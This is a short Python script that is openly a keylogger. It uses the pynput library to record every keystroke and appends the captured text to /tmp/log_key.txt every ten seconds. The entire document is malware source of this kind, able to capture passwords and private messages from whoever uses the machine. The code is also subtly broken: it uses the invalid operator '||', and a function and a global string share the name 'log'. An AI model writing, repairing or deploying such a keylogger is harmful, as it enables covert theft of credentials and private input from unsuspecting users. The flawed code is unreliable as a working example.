#!/usr/bin/python3

import pynput.keyboard as pykb
import threading

log = ""
path = "/tmp/log_key.txt"


def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.down || key == key.up || key == key.left || key == key.right:
            log += ""
        else:
            log = log + " " + str(key) + " "

def log():
    global log
    global path

    fin = open(path, 'a')
    fin.write(log)
    log = ""
    fin.close()

    timer = threading.Timer(10, log)
    timer.start()

def start():
    keyboard_listener = pykb.Listener(on_press=process_keys)
    with keyboard_listener:
        log()
        keyboard_listener.join()
